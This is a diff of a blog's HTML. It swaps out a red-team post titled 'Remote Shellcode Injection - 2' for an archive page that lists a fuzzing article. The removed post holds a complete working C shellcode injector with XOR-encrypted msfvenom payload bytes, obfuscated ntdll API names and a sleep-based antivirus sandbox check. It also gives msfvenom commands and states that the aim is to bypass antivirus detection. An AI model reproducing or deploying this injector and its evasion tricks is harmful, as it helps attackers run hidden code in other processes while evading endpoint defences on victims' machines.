@@ -6,25 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Remote Shellcode Injection - 2 | cppblog</title>
+  <title>Archives: 2023/3 | cppblog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Improving the injector from last post to hopefully bypass AV">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Remote Shellcode Injection - 2">
-<meta property="og:url" content="http://example.com/2021/10/07/scinjection2/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="cppblog">
+<meta property="og:url" content="http://example.com/archives/2023/03/index.html">
 <meta property="og:site_name" content="cppblog">
-<meta property="og:description" content="Improving the injector from last post to hopefully bypass AV">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2021/10/07/scinjection2/old.png">
-<meta property="og:image" content="http://example.com/2021/10/07/scinjection2/new.png">
-<meta property="article:published_time" content="2021-10-07T07:00:00.000Z">
-<meta property="article:modified_time" content="2022-09-03T05:41:54.000Z">
 <meta property="article:author" content="cp">
-<meta property="article:tag" content="windows">
-<meta property="article:tag" content="redteam">
-<meta property="article:tag" content="injection">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/10/07/scinjection2/old.png">
   
     <link rel="alternative" href="/atom.xml" title="cppblog" type="application/atom+xml">
   
@@ -152,206 +142,60 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-scinjection2" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      Remote Shellcode Injection - 2
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2023" class="archive-year">2023</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2023/03/26/fuzzing4/" class="archive-article-date">
+  	<time datetime="2023-03-26T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-03-26</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2023/03/26/fuzzing4/">Fuzzing an email client</a>
     </h1>
   
 
-        
-        <a href="/2021/10/07/scinjection2/" class="archive-article-date">
-  	<time datetime="2021-10-07T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Improving the injector from last post to hopefully bypass AV</p>
-<span id="more"></span>
-<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><strong>OS: Windows 10<br>Target: Running processes with the same integrity level</strong></p>
-<p>These are some tools that might be useful.</p>
-<ul>
-<li>API Monitor: <a target="_blank" rel="noopener" href="http://www.rohitab.com/apimonitor">http://www.rohitab.com/apimonitor</a></li>
-<li>Process Hacker: <a target="_blank" rel="noopener" href="https://processhacker.sourceforge.io/">https://processhacker.sourceforge.io/</a></li>
-</ul>
-<p>The previous injector is still pretty detectable by static analysis, so let’s make it more stealthy this time.</p>
-<h2 id="Methodology"><a href="#Methodology" class="headerlink" title="Methodology"></a>Methodology</h2><ul>
-<li>Remove debugging symbols and statements</li>
-<li>Remove strings that hint anything malicious</li>
-<li>Generate shellcode exits gracefully without crashing program</li>
-<li>XOR encrypt shellcode and decode during runtime</li>
-<li>“Predict” if being executed by AV and change behaviour</li>
-</ul>
-<p>As usual, coding in the C language because C++ is nasty.</p>
-<h2 id="Better-shellcode"><a href="#Better-shellcode" class="headerlink" title="Better shellcode"></a>Better shellcode</h2><p>In the previous post we generated a shellcode with the following command.<br><code>msfvenom -p windows/x64/exec CMD=cmd.exe -f c</code><br>When this shellcode exits, it ends the entire program, which is pretty noisy.</p>
-<p>We can change this by using the <code>EXITFUNC</code> flag.<br><code>msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c</code><br>Now when the shellcode exits, it will only terminate the thread that we spawn, and the original program will still be running.</p>
-<h2 id="XOR-encrypt-and-decrypt"><a href="#XOR-encrypt-and-decrypt" class="headerlink" title="XOR encrypt and decrypt"></a>XOR encrypt and decrypt</h2><p>Cleartext msf shellcode is always a giveaway. We can make it better by XOR encrypting it.</p>
-<h3 id="Encryptor-Decryptor"><a href="#Encryptor-Decryptor" class="headerlink" title="Encryptor/Decryptor"></a>Encryptor/Decryptor</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> * <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> * <span class="title">encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * data, <span class="keyword">int</span> dataLen, <span class="keyword">int</span> xor_key)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * output = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>) * dataLen+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dataLen; i++)</span><br><span class="line">		output[i] = data[i] ^ xor_key;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> clear[] =</span><br><span class="line">	<span class="comment">// paste shellcode blob here</span></span><br><span class="line">	<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> sc_len = <span class="keyword">sizeof</span>(clear)<span class="number">-1</span>; <span class="comment">// auto sized char arrays are 1 byte larger by default</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * out = encrypt(clear, sc_len, <span class="number">0x53</span>); <span class="comment">// key of 0x53</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sc_len; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ( !(i%<span class="number">22</span>) &amp;&amp; i!=<span class="number">0</span> )</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\&quot;\n\&quot;&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, out[i]);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\&quot;;&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Comments are self explanatory. The encrypt function is essentially also the decrypt function because A=(A^B)^B</p>
-<p>Main function just formats encrypted shellcode nicely so we can copy and paste, and we only need the encrypt function in our actual injector.</p>
-<h2 id="“Predict”-AV-execution"><a href="#“Predict”-AV-execution" class="headerlink" title="“Predict” AV execution"></a>“Predict” AV execution</h2><p>So apparently AVs will try to “speed up” your program if they detect a sleep in it, so it won’t spend too long analysing. We can abuse this by checking if our program was indeed “sped up”.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">time_t</span> cur = time(<span class="number">0</span>);</span><br><span class="line">Sleep(<span class="number">15000</span>);</span><br><span class="line"><span class="keyword">time_t</span> aft = time(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ((aft - cur) &lt; <span class="number">15</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;update failed&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Just a simple check that quits the program if it “predicts” an AV executing it. Delays execution by 15 seconds so some AV might even give up analysing it lol. Patience is key.</p>
-<h2 id="Remove-strings-and-debug-symbols"><a href="#Remove-strings-and-debug-symbols" class="headerlink" title="Remove strings and debug symbols"></a>Remove strings and debug symbols</h2><p>Running the command <code>strings</code> on our exe reveals strings such as “NtCreateThreadEx”, which may lead to AV detection.</p>
-<p>We can remove these strings by again XOR encrypting them and decrypting during runtime.</p>
-<p>For example:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> * ntdll = decrypt(<span class="string">&quot;\x3d\x27\x37\x3f\x3f\x7d\x37\x3f\x3f\x53&quot;</span>, <span class="number">10</span>, <span class="number">0x53</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> * navm = decrypt(<span class="string">&quot;\x1d\x27\x12\x3f\x3f\x3c\x30\x32\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53&quot;</span>, <span class="number">24</span>, <span class="number">0x53</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> * nwvm = decrypt(<span class="string">&quot;\x1d\x27\x04\x21\x3a\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53&quot;</span>, <span class="number">21</span>, <span class="number">0x53</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> * ncte = decrypt(<span class="string">&quot;\x1d\x27\x10\x21\x36\x32\x27\x36\x07\x3b\x21\x36\x32\x37\x16\x2b\x53&quot;</span>, <span class="number">17</span>, <span class="number">0x53</span>);</span><br></pre></td></tr></table></figure>
-<p>Repeat this process until all abnormal strings are removed.</p>
-<p>To remove debug symbols, just run <code>strip &lt;program.exe&gt;</code></p>
-<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR  Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_ATTRIBUTES</span> &#123;</span></span><br><span class="line">    ULONG           Length;</span><br><span class="line">    HANDLE          RootDirectory;</span><br><span class="line">    PUNICODE_STRING ObjectName;</span><br><span class="line">    ULONG           Attributes;</span><br><span class="line">    PVOID           SecurityDescriptor;</span><br><span class="line">    PVOID           SecurityQualityOfService;</span><br><span class="line">&#125; OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_ATTRIBUTE</span> &#123;</span></span><br><span class="line">    ULONG Attribute;</span><br><span class="line">    SIZE_T Size;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG Value;</span><br><span class="line">        PVOID ValuePtr;</span><br><span class="line">    &#125; u1;</span><br><span class="line">    PSIZE_T ReturnLength;</span><br><span class="line">&#125; PS_ATTRIBUTE, *PPS_ATTRIBUTE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_ATTRIBUTE_LIST</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SIZE_T       TotalLength;</span><br><span class="line">    PS_ATTRIBUTE Attributes[<span class="number">1</span>];</span><br><span class="line">&#125; PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* NAVM)</span><span class="params">(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* NWVM)</span><span class="params">(HANDLE, PVOID, PVOID, ULONG, PULONG)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* NCT)</span><span class="params">(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> * <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> * <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> * data, <span class="keyword">int</span> dataLen, <span class="keyword">int</span> xor_key)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * output = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>) * dataLen+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dataLen; i++)</span><br><span class="line">		output[i] = data[i] ^ xor_key;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">time_t</span> cur = time(<span class="number">0</span>);</span><br><span class="line">	Sleep(<span class="number">15000</span>);</span><br><span class="line">	<span class="keyword">time_t</span> aft = time(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> ((aft - cur) &lt; <span class="number">15</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;update failed&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * ntdll = decrypt(<span class="string">&quot;\x3d\x27\x37\x3f\x3f\x7d\x37\x3f\x3f\x53&quot;</span>, <span class="number">10</span>, <span class="number">0x53</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * navm = decrypt(<span class="string">&quot;\x1d\x27\x12\x3f\x3f\x3c\x30\x32\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53&quot;</span>, <span class="number">24</span>, <span class="number">0x53</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * nwvm = decrypt(<span class="string">&quot;\x1d\x27\x04\x21\x3a\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53&quot;</span>, <span class="number">21</span>, <span class="number">0x53</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * ncte = decrypt(<span class="string">&quot;\x1d\x27\x10\x21\x36\x32\x27\x36\x07\x3b\x21\x36\x32\x37\x16\x2b\x53&quot;</span>, <span class="number">17</span>, <span class="number">0x53</span>);</span><br><span class="line">	</span><br><span class="line">  <span class="comment">// &#123; msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c &#125; payload encryped with XOR key 0x53</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> encoded[] = </span><br><span class="line"><span class="string">&quot;\xaf\x1b\xd0\xb7\xa3\xbb\x93\x53\x53\x53\x12\x02\x12\x03\x01\x02\x05\x1b\x62\x81\x36\x1b&quot;</span></span><br><span class="line"><span class="string">&quot;\xd8\x01\x33\x1b\xd8\x01\x4b\x1b\xd8\x01\x73\x1b\xd8\x21\x03\x1b\x5c\xe4\x19\x19\x1e\x62&quot;</span></span><br><span class="line"><span class="string">&quot;\x9a\x1b\x62\x93\xff\x6f\x32\x2f\x51\x7f\x73\x12\x92\x9a\x5e\x12\x52\x92\xb1\xbe\x01\x12&quot;</span></span><br><span class="line"><span class="string">&quot;\x02\x1b\xd8\x01\x73\xd8\x11\x6f\x1b\x52\x83\xd8\xd3\xdb\x53\x53\x53\x1b\xd6\x93\x27\x34&quot;</span></span><br><span class="line"><span class="string">&quot;\x1b\x52\x83\x03\xd8\x1b\x4b\x17\xd8\x13\x73\x1a\x52\x83\xb0\x05\x1b\xac\x9a\x12\xd8\x67&quot;</span></span><br><span class="line"><span class="string">&quot;\xdb\x1b\x52\x85\x1e\x62\x9a\x1b\x62\x93\xff\x12\x92\x9a\x5e\x12\x52\x92\x6b\xb3\x26\xa2&quot;</span></span><br><span class="line"><span class="string">&quot;\x1f\x50\x1f\x77\x5b\x16\x6a\x82\x26\x8b\x0b\x17\xd8\x13\x77\x1a\x52\x83\x35\x12\xd8\x5f&quot;</span></span><br><span class="line"><span class="string">&quot;\x1b\x17\xd8\x13\x4f\x1a\x52\x83\x12\xd8\x57\xdb\x1b\x52\x83\x12\x0b\x12\x0b\x0d\x0a\x09&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\x0b\x12\x0a\x12\x09\x1b\xd0\xbf\x73\x12\x01\xac\xb3\x0b\x12\x0a\x09\x1b\xd8\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x04\xac\xac\xac\x0e\x1b\xe9\x52\x53\x53\x53\x53\x53\x53\x53\x1b\xde\xde\x52\x52\x53\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x12\xe9\x62\xd8\x3c\xd4\xac\x86\xe8\xb3\x4e\x79\x59\x12\xe9\xf5\xc6\xee\xce\xac\x86\x1b&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x97\x7b\x6f\x55\x2f\x59\xd3\xa8\xb3\x26\x56\xe8\x14\x40\x21\x3c\x39\x53\x0a\x12\xda&quot;</span></span><br><span class="line"><span class="string">&quot;\x89\xac\x86\x30\x3e\x37\x7d\x36\x2b\x36\x53&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> XOR_KEY = <span class="number">0x53</span>;</span><br><span class="line">	<span class="keyword">size_t</span> sc_len = <span class="keyword">sizeof</span>(encoded)<span class="number">-1</span>; <span class="comment">//auto type char array will +1 by default</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> * shellcode = decrypt(encoded, sc_len, XOR_KEY);</span><br><span class="line">	<span class="keyword">int</span> newPid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, (DWORD)newPid);</span><br><span class="line">    HANDLE tHandle;</span><br><span class="line">    HINSTANCE hNtdll = LoadLibraryA(ntdll);</span><br><span class="line"></span><br><span class="line">    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, navm);</span><br><span class="line">    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, nwvm);</span><br><span class="line">    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, ncte);</span><br><span class="line">    <span class="keyword">void</span> * allocAddr = <span class="literal">NULL</span>;</span><br><span class="line">    SIZE_T allocSize = sc_len;</span><br><span class="line">    NTSTATUS status;</span><br><span class="line">    status = NtAllocateVirtualMemory(pHandle, &amp;allocAddr, <span class="number">0</span>, (PULONG)&amp;allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    status = NtWriteVirtualMemory(pHandle, allocAddr, shellcode, sc_len, <span class="literal">NULL</span>);</span><br><span class="line">    status = NtCreateThreadEx(&amp;tHandle, GENERIC_EXECUTE, <span class="literal">NULL</span>, pHandle, allocAddr, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Let’s use antiscan.me to check detection rate.</p>
-<p>Before:</p>
-<img src="/2021/10/07/scinjection2/old.png" class="" title="old">
-
-<p>After:</p>
-<img src="/2021/10/07/scinjection2/new.png" class="" title="new">
-
-<p>Pretty neat!</p>
-<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Still a pretty rudimentary bypass as we didn’t take into account hooks and AMSI and all the improved monitoring tools out there.</p>
-<p>AV manufacturers and hackers have played years of cats and mice, and there are lots to learn :)</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">windows</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">redteam</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">injection</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">fuzzing</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/10/07/scinjection2/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2021/10/12/cmd5-promotion/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Best Hash Cracking Website
-        
-      </div>
-    </a>
   
   
-    <a href="/2021/07/31/scinjection1/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Remote Shellcode Injection - 1</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -374,8 +218,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
